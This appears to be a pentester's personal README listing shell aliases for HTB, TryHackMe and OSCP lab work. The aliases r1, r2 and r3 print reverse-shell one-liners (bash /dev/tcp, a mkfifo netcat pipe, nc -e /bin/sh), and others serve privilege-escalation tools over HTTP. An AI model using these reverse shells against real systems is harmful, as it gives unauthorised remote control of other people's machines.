this repository is for random things i use and consider as useful


this is my aliases 
```
alias webserver='sudo python -m http.server 80'
alias HTB='sudo openvpn /root/HTB/BassamAssri.ovpn'
alias autonmap='/opt/nmapAutomator.sh -t All -H'
alias THM='sudo openvpn /root/THM/NoBody.ovpn'
alias OSCP='sudo openvpn /root/oscp/connect/OS-*****-PWK.ovpn'
alias smbb='python3 /usr/share/doc/python3-impacket/examples/smbserver.py share $(pwd) -smb2support'
alias r1='f(){ echo "bash -i >& /dev/tcp/"$1"/"$2" 0>&1" ;  unset -f f; }; f'
alias r2='f(){ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "$1" "$2" >/tmp/f" ;  unset -f f; }; f'
alias r3='f(){ echo "nc -e /bin/sh "$1" "$2"" ;  unset -f f; }; f'
alias kira='stty raw -echo;fg'
alias rootme="cd /opt/privesc && ifconfig && echo $(pwd) && webserver"```
